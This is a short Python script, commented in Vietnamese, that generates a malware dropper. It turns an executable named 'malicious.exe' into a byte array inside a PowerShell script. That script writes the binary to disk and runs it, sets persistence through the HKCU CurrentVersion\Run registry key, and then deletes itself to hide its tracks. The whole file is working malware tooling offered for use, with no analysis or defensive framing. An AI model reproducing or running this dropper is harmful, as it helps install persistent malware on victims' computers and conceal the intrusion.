#define
sourceFile_name = 'malicious.exe'								#Ten cua file dung de Drop
dropper_name = 'dropper.ps1'									#Ten cua Dropper
drop_fullPath = ""	
#drop_fullPath = 'C:\\Users\\duong\\Desktop\\dropper' + "\\"	#Duong dan de drop file vao									
drop_name = 'xxx.exe'											#Ten cua file sau khi duoc Drop

#generate funcion
def generator():
	#open file
	sourceFile = open(sourceFile_name, 'rb')
	desFile = open(dropper_name, 'wb')

	desFile.write("[byte[]]$bytes = ")
	#read byte to byte from source file
	#then write to byte array in des file
	byte = sourceFile.read(1)
	desFile.write(str(ord(byte)))
	while True:
		byte = sourceFile.read(1)
		if byte == "":
			break
		desFile.write(',')
		desFile.write(str(ord(byte)))
	desFile.write("\n")

	#get full path drop
	if drop_fullPath == "":
		desFile.write("$scriptPath = split-path -parent $MyInvocation.MyCommand.Definition" + "\n")
		desFile.write("$fullPathDropFile = $scriptPath +" + "'\\" + drop_name + "'\n")
	else:
		desFile.write("$fullPathDropFile = '" + drop_fullPath + drop_name + "'" + "\n")

	#command drop
	desFile.write("[System.IO.File]::WriteAllBytes($fullPathDropFile, $bytes)" + "\n")

	#execute file
	desFile.write("Start-Process -FilePath $fullPathDropFile\n")

	#persistent
	desFile.write("New-ItemProperty -Path 'HKCU:Software\Microsoft\Windows\CurrentVersion\Run' -Name 'drop' -Value $fullPathDropFile  -PropertyType 'String'" + "\n")
		
	#self-destruct
	desFile.write("$CurrentScriptFullPathName = $MyInvocation.MyCommand.Definition" + "\n")
	desFile.write("Remove-Item $CurrentScriptFullPathName")

	#close file
	sourceFile.close()
	desFile.close()

	return 0

def main():
	#gen dropper
	print ("Generating Dropper ...")
	generator()
	print ("Done")
  
  
if __name__== "__main__":
  main()

